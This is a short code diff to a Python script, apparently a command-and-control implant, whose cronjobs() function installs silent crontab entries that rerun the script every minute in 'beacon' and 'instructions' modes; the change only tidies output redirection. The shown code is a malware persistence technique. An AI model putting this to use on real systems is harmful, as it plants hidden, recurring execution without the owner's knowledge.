@@ -10,9 +10,9 @@ import time
 ##whoami variable ensures that the program will always know where it is  
 def cronjobs():
 	whoami = os.getcwd()+"/charlex.py"
-	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+'  >/dev/null >/dev/null 2>&1") | crontab -'
-	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null >/dev/null 2>&1")| crontab -'
-	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null >/dev/null 2>&1")| crontab -'
+	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+' >/dev/null 2>&1") | crontab -'
+	beacon = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' beacon >/dev/null 2>&1")| crontab -'
+	instructions = '(crontab -l 2>/dev/null; echo "* * * * * '+whoami+' instructions >/dev/null 2>&1")| crontab -'
 	os.system(start)
 	os.system(beacon)
 	os.system(instructions)
